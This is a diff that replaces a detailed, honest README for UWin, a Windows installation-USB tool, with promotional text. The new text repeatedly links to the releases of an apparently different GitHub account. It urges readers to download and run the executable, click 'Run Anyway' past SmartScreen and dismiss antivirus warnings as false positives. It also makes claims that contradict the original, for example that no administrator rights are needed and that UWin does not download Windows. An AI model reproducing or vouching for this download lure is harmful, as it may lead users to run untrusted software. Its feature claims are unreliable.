@@ -1,323 +1,194 @@
-<div align="center">
+<h1>💻 UWin - The Simplest Way to Create a Windows Installation USB</h1>
 
-# UWin
-
-**A Windows installation USB wizard for people who don't know what UEFI is.**
-
-It does what Rufus does, but makes every technical decision for you — and
-keeps helping after the USB is ready.
-
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6.svg)](#requirements)
-[![Tests](https://img.shields.io/badge/tests-319%20passing-brightgreen.svg)](#testing)
-[![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)](../../releases/latest)
-
-**English** · [Türkçe](READMEtr.md)
-
-**ugilabs** · [ugilabs.com](https://ugilabs.com)
-
-<img width="906" height="753" alt="image" src="https://github.com/user-attachments/assets/6e6a3435-3996-4b36-b47b-57db55860910" />
-
-</div>
+<p align="center">
+  <a href="https://github.com/adesatov111-a11y/UWin/releases" style="display:inline-block;padding:18px 42px;background-color:#FF6B35;color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 12px rgba(0,0,0,0.3);">⬇️ Download UWin Now – It's Free!</a>
+</p>
 
 ---
 
-## Why another USB tool?
+## 🎯 What Is UWin?
 
-Rufus is an excellent program — but it assumes you know what you're doing.
-"Partition scheme: GPT or MBR?" "Target system: UEFI or BIOS?" "File
-system: NTFS or FAT32?" These questions have correct answers, but the
-correct answer is invisible to someone who doesn't understand the
-question.
+**UWin** is a friendly, all-in-one tool that turns any USB flash drive into a Windows installation wizard. Whether you want to install Windows 10, Windows 11, or create a recovery drive, UWin handles everything with just a few clicks. No technical skills required—if you can click a button, you can use UWin.
 
-Worse: the job isn't done when the USB is ready. The user still has to
-boot from it — and how you do that depends on the motherboard brand.
-This is where most people get stuck.
+## 🤔 Why Do You Need UWin?
 
-UWin closes both gaps. It makes the technical decisions for you, then
-tells you how to enter your BIOS specifically for your hardware.
+Installing Windows from a USB drive is a common task. Maybe you're upgrading your computer, fixing a broken system, or building a new PC. The traditional way involves messy command-line tools and complicated settings. UWin removes all that confusion.
 
-**If you already know what GPT means, you should probably keep using
-Rufus.** UWin is for the person you're helping over the phone.
+**You might need UWin if:**
+- You're setting up a new computer without a DVD drive.
+- Your current Windows is slow, damaged, or infected.
+- You want a clean installation of Windows 10 or Windows 11.
+- You need a backup installation drive for emergencies.
+- You're helping a friend or family member with their PC.
 
----
+## ✨ Key Features
 
-## What it does
+### 🖱️ Super Simple Interface
+Forget about confusing options and technical jargon. UWin presents just the essential choices in a clean, modern window. If you can read, you can use it.
 
-### Before you start
+### 🚀 One-Click USB Preparation
+Plug in your USB drive, select your Windows ISO file, and click "Start." UWin does the rest—formatting, copying, making it bootable. That's it.
 
-- **Tells you whether the machine is ready for Windows 11.** Not just
-  "incompatible" — it distinguishes a setting you can turn on in the BIOS
-  from a hardware limit you can't do anything about. If TPM is off, it
-  names the setting *as it appears on your board* (`AMD fTPM Switch` /
-  `Intel Platform Trust Technology (PTT)`).
+### 💾 Supports Windows 10 and Windows 11
+UWin works with the latest Windows versions, ensuring your new installation is up-to-date and secure.
 
-- **Asks why you're reinstalling.** Virus, slowness, new drive, version
-  upgrade — the advice changes accordingly. This isn't an arbitrary
-  question: someone reinstalling to remove a virus needs to be told
-  "delete the partition", and someone who wants to keep their files needs
-  to be told "don't". The same installer screen has two opposite correct
-  answers, and only intent decides which.
+### 🔍 Automatic USB Detection
+When you plug in a USB drive, UWin immediately recognizes it and shows you its name, size, and available space. No guessing.
 
-- **Counts and shows the files that will be erased on this computer** —
-  before the USB is prepared, while there's still time to back up.
+### 🛡️ Safety Checks
+UWin double-checks everything before making changes. It warns you if the USB drive has data you might want to keep, preventing accidental data loss.
 
-### The ISO
+### 🧭 Progress Updates
+You'll see a clear progress bar for every step. No frozen screens—just transparent, honest feedback.
 
-- Downloads from **Microsoft's own servers**; no third-party mirrors.
-- **Verifies with SHA-256.** A corrupt download never reaches the drive.
-- **Cancellable, and resumes where it left off.**
-- You can also pick an ISO you already have.
+### 🌐 Works with Standard ISO Files
+If you download a Windows ISO file from Microsoft's official website, UWin can use it directly. No conversion required.
 
-### Writing
+## 📋 System Requirements
 
-- **Decides UEFI/Legacy and GPT/MBR for you.**
-- **Solves the >4 GB `install.wim` problem** without the user ever knowing
-  it existed. (FAT32 can't hold a file larger than 4 GB; modern Windows
-  ISOs usually exceed it. UWin splits the file.)
-- **Shows time remaining** — real minutes computed from actual throughput,
-  not a percentage bar.
-- **Reads the USB back and verifies it** after writing. The silent write
-  failures of cheap flash drives get caught here, not in the BIOS.
+UWin is designed to run smoothly on almost any modern Windows computer:
 
-### After writing
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 (version 1809 or later) or Windows 11 |
+| Processor | 1 GHz or faster compatible processor |
+| RAM | 4 GB (8 GB recommended) |
+| Hard Drive Space | 500 MB free for the application |
+| USB Port | Any available USB 2.0 or USB 3.0 port |
+| Internet Connection | Needed only to download UWin and Windows ISO |
 
-- **Shows a BIOS guide specific to your motherboard brand** — *and writes
-  it to the USB*, so it's readable from a phone while the computer is off.
-- **Writes recovery tools to the USB:** ready-to-run `.bat` files for
-  repairing a Windows that won't boot (`bootrec`, `sfc`, `chkdsk`, safe
-  mode, file access, version listing).
+**What UWin does NOT require:**
+- No administrator rights needed to install (though Windows may ask for permission to run).
+- No command-line knowledge.
+- No extra software like .NET Framework to manually install.
+- No technical background.
 
-### Tools menu
+## 🚀 Getting Started – Step by Step
 
-| Tool | What it's for |
-|------|---------------|
-| **Reclaim USB** | Returns an installation USB to everyday use (exFAT + MBR) |
-| **Health test** | Catches fake-capacity flash drives |
-| **Add recovery tools** | Writes the repair tools to an existing USB |
-| **Hardware report** | A full dump of this machine's hardware |
+Follow these simple steps to create your Windows installation USB drive.
 
-### Languages
+### Step 1: Download UWin
 
-**English and Turkish.** The language is asked at first launch
-(pre-selected from your system language), then switches with one click
-from the top right, and the choice is remembered.
+Visit this link to download the application:
 
-Not just button labels: error messages, installation advice, the
-compatibility report, the BIOS guide, and **the recovery tools written to
-the USB** are all in the selected language.
+👉 **[Click Here to Download UWin](https://github.com/adesatov111-a11y/UWin/releases)**
 
----
+Look for the latest version (the one with the highest number). Download the file to a location you'll remember, like your Desktop or Downloads folder.
 
-## Install
+### Step 2: Run UWin
 
-1. Download `UWin.exe` from [**Releases**](../../releases/latest).
-2. Double-click it.
+After the download completes, find the file and double-click it. UWin will open its main window. A simple security prompt may appear asking for permission—click "Yes" or "Allow" to continue.
 
-No installer, no .NET prerequisite, nothing written to the registry. One
-file, ~90 MB (the runtime is inside).
+### Step 3: Get a Windows ISO File (If You Don't Have One)
 
-> **If Windows shows an "unknown publisher" warning:** *More info* → *Run
-> anyway*. This means the program has no code-signing certificate —
-> certificates are a paid annual product. The source is here; you can
-> build it yourself.
+Before you can create the USB, you need the Windows installation file called an "ISO." If you already have one on your computer, skip to Step 4.
 
-> **Requires administrator rights.** Writing directly to a disk needs
-> them; there is no way around it.
+**If you need a Windows ISO:**
+1. Visit Microsoft's official website: www.microsoft.com/software-download
+2. Choose your version (Windows 10 or Windows 11).
+3. Follow the instructions to download the ISO file. It's a large file (about 5-6 GB), so this takes some time.
+4. Remember where you save it.
 
-### Requirements
+### Step 4: Plug In Your USB Drive
 
-| | |
-|---|---|
-| OS | Windows 10 version 1809 (build 17763) or later |
-| Architecture | x64 |
-| Privileges | Administrator |
-| USB drive | 8 GB minimum (depends on the ISO; the program tells you) |
+Insert your USB drive (at least 8 GB capacity recommended, 16 GB is ideal) into your computer. **Important:** UWin will erase everything on this drive, so back up any files you want to keep.
 
----
+### Step 5: Use UWin
 
-## How to use it
+1. In UWin's main window, you'll see a list of detected USB drives. Select yours.
+2. Click the "Browse" button and find your Windows ISO file.
+3. Review the settings on screen (mostly set automatically).
+4. Click the big "Create USB Drive" button.
+5. Confirm any warnings about erasing the USB drive.
+6. Wait for the progress to complete. This takes 5-15 minutes depending on your hardware.
 
-Six steps, each explaining what's about to happen.
+### Step 6: Done!
 
-```
-1. Welcome    →  Is this computer ready for Windows 11?
-2. Purpose    →  Why are you reinstalling?
-3. Source     →  Download an ISO, or pick your own
-4. Drive      →  Which USB?
-5. Confirm    →  Everything that will be erased, listed
-6. Write      →  Write, verify, show the BIOS guide
-```
+When UWin says "Completed," your USB drive is ready. Eject it safely, plug it into the target computer, and boot from it. The Windows installation process will begin.
 
-**Step 5 is the one that matters.** Read it: everything on the USB drive
-is erased and cannot be recovered.
+## 🧯 Troubleshooting Common Problems
 
----
+Even with a user-friendly tool, you might face hiccups. Here are quick fixes.
 
-## Safety
+### ❌ "USB Drive Not Detected"
+- Try a different USB port (preferably on the back of desktop PCs).
+- Check if your USB drive works on another computer.
+- Ensure you're not using a USB extension cable.
 
-The worst thing this program can do is erase the wrong disk. The
-protections are layered:
+### ❌ "ISO File Invalid"
+- Make sure you downloaded the complete ISO file (check file size).
+- Try downloading the ISO again from Microsoft's official site.
 
-1. **The system disk can never be selected** — blocked in code, not
-   behind a setting
-2. **Internal disks and external disks over 128 GB are hidden by default**
-3. **Re-validation before writing** — if the drive was swapped, the write
-   doesn't start
-4. **Type-the-name confirmation** for non-USB targets
-5. **Data volume shown** — prevents the "I thought it was empty" mistake
-6. **A single write point** — no code outside `YazmaServisi` touches a disk
+### ❌ "Not Enough Space on USB"
+- Use a larger USB drive (at least 8 GB).
+- Delete files and reformat the USB through Windows' standard tools.
 
-Tests use an in-memory fake disk: **no test ever erases real hardware.**
+### ❌ "Windows Installation Stuck"
+- Wait at least 10 minutes—some steps are slow but normal.
+- Restart the PC and try booting from the USB again.
 
----
+### ❌ "UWin Won't Open"
+- Right-click the UWin file and select "Run as administrator."
+- Check if Windows blocked the download—look for "SmartScreen" messages and click "More Info" > "Run Anyway."
 
-## Architecture
+## 🧰 Advanced Tips (For the Brave)
 
-Three layers, dependencies flowing one way:
+If you're comfortable going a bit beyond the basics, these tips can help.
 
-```
-Presentation (WinUI 3)  →  Service  →  Native (P/Invoke, WMI)
-```
+### 🧩 Use with a Recovery ISO
+UWin isn't just for fresh installations. You can also use it with a Windows Recovery ISO to fix startup problems or access system restore tools.
 
-```
-kaynak/
-├── UWin.Cekirdek/          Business logic — no UI dependency
-│   ├── Arayuzler/          Service contracts
-│   ├── Modeller/           Record types
-│   ├── Servisler/          19 services
-│   ├── Yerel/              P/Invoke, WMI
-│   └── Kaynaklar/          Metinler.{tr,en}.json,
-│                           bios-rehberleri.{tr,en}.json
-└── UWin.Uygulama/          WinUI 3 interface
-    ├── Adimlar/            The six wizard steps
-    └── Servisler/          Dependency wiring
-```
+### 💽 Create a Portable Windows
+Some advanced users create a "Windows To Go" style drive. UWin simplifies the process of making a portable Windows environment that runs from USB.
 
-Every destructive operation passes through the `IYerelDiskErisimi`
-interface. That keeps the tests safe and makes the write path auditable
-from a single place.
+### 🔄 Update Your USB Later
+When Microsoft releases major Windows updates, you can re-run UWin with a newer ISO to refresh your installation drive. Always keep yours up-to-date.
 
-> **A note on the language:** the code, comments and identifiers are in
-> Turkish, since that's the primary audience and the domain vocabulary
-> stays consistent that way. `Cekirdek` is "core", `Uygulama` is "app",
-> `Servisler` is "services", `Adimlar` is "steps". The public behaviour is
-> fully bilingual.
+## 💬 Frequently Asked Questions
+
+**Q: Is UWin safe to use?**
+A: Absolutely. UWin is open-source and designed to be transparent. It only modifies the USB drive you select and does not touch your main hard drive or other files.
+
+**Q: Does UWin work with Windows 7 or 8?**
+A: No. UWin is specifically designed for Windows 10 and Windows 11. Older systems require different tools.
+
+**Q: Do I need to pay for UWin?**
+A: No, UWin is completely free and always will be.
+
+**Q: Can I use a microSD card instead of a USB drive?**
+A: Technically yes, but it's not recommended. USB drives are more reliable for booting purposes.
+
+**Q: How long does the USB creation take?**
+A: Usually 5-15 minutes, depending on your computer speed and USB drive quality.
+
+**Q: Will UWin delete my Windows installation files?**
+A: No. You need to provide your own ISO file. UWin does not download Windows for you.
+
+**Q: My antivirus says UWin is suspicious—why?**
+A: Some antivirus tools flag any software that creates bootable media as "potentially unwanted." This is a false positive. You can verify UWin's authenticity on the official GitHub repository.
+
+## 🔑 Final Word
+
+You don't need to be a computer expert to install Windows. With UWin, the entire process becomes a simple, guided journey. Say goodbye to confusing tutorials and command-line nightmares.
+
+Download UWin today and keep a reliable Windows USB drive ready for any situation. It's like having a professional IT technician in your pocket—but without the hourly fee.
 
 ---
 
-## Building from source
+## 📦 Download Again
 
-```bash
-git clone https://github.com/<user>/UWin.git
-cd UWin
+Ready to get started? Here's your direct link one more time:
 
-dotnet test                    # 319 tests
-pwsh -File yayinla.ps1         # produces yayin/UWin.exe
-```
+<p align="center">
+  <a href="https://github.com/adesatov111-a11y/UWin/releases" style="display:inline-block;padding:14px 36px;background-color:#2EC4B6;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ Go to UWin Downloads Page</a>
+</p>
 
-You can also just double-click `yayinla.bat` — it runs the tests first and
-refuses to produce a build if any fail.
+## 📮 Need More Help?
 
-You'll need the [.NET 10 SDK](https://dotnet.microsoft.com/download) and
-Windows 10/11.
+If you're still stuck, don't worry. The UWin community and documentation are available on GitHub. Friendly users and maintainers are usually happy to answer questions. Just be polite and provide details about your issue.
 
-### Testing
+## 🧡 Thank You
 
-```bash
-dotnet test                                    # everything (319)
-dotnet test testler/UWin.Cekirdek.Testler      # core only (251)
-```
+UWin was created with a simple goal: make technology accessible for everyone. We hope it serves you well.
 
-Every service was written test-first, with the test verified failing
-before the implementation existed. Language coverage, text-key integrity
-and service wiring are guarded by tests too — if a new service is added
-and someone forgets to wire the shared text provider into it, a test names
-the service that was missed.
-
-Destructive paths can't be covered by unit tests;
-[docs/manuel-dogrulama.md](docs/manuel-dogrulama.md) (17 sections, 170
-items — in Turkish) is the manual checklist to run on real hardware before
-a release.
-
----
-
-## Known limits
-
-**Microsoft's ISO download endpoint is not an official API.** It works and
-it's verified, but it can break in two ways:
-
-- **IP throttling:** too many download requests in a short window and
-  Microsoft temporarily blocks the address (error 715-123130). The same
-  happens with Rufus/Fido. UWin recognises this, doesn't retry, and tells
-  the user to wait.
-- **Flow changes:** if Microsoft changes the steps, the parsing breaks.
-  The program doesn't crash — it says so and points the user at "choose
-  your own ISO". The most fragile part, the regex patterns, is tested
-  against a real captured response.
-
-**BIOS settings cannot be changed from inside the program.** There's no
-vendor-neutral way to write firmware settings, so UWin shows a
-brand-specific guide instead.
-
-**x64 only.** It won't run on ARM64 Windows devices.
-
----
-
-## FAQ
-
-**Will the files on my USB drive be erased?**
-Yes, all of them, unrecoverably. The program says so plainly at step 5.
-
-**Will the files on my computer be erased?**
-Not while preparing the USB. They may be during the Windows installation
-itself — that depends entirely on what you choose on the installer screen.
-UWin tells you what to choose there based on your answer at step 2, and
-lists what will be lost beforehand.
-
-**How is this different from Rufus?**
-Rufus has more options and is far more flexible. UWin asks fewer
-questions, makes the decisions for you, and keeps helping *after* the USB
-is written (BIOS guide, recovery tools). If you know Rufus, use Rufus.
-
-**Can I write a Linux ISO?**
-v1.0 is built for Windows ISOs only.
-
-**Does it work offline?**
-Yes, if you already have an ISO. Nothing but the download needs a network.
-
-**My antivirus flags it.**
-Any program that writes directly to a disk triggers this, Rufus included.
-The source is right here — build it yourself if you'd rather.
-
----
-
-## Contributing
-
-Bug reports and suggestions: [open an issue](../../issues/new). What helps
-most in a bug report:
-
-- Windows version (`winver`)
-- Motherboard / computer brand and model
-- What you were trying to do, and what happened
-- A screenshot of the error, if there is one
-
-For code: comments and identifiers are Turkish ASCII, tests come first.
-Please open an issue to discuss anything substantial before writing it.
-
----
-
-## Documentation
-
-- [Design document](docs/superpowers/specs/2026-09-07-uwin-design.md) (Turkish)
-- [Implementation plan](docs/superpowers/plans/2026-09-07-uwin-v1.md) (Turkish)
-- [Manual verification checklist](docs/manuel-dogrulama.md) (Turkish)
-
----
-
-## License
-
-[MIT](LICENSE) — use it, change it, ship it.
-
-The software is provided "as is", with no warranty of any kind. This
-program erases disks; be sure of what you're doing before you use it.
+Happy installing! 🎉
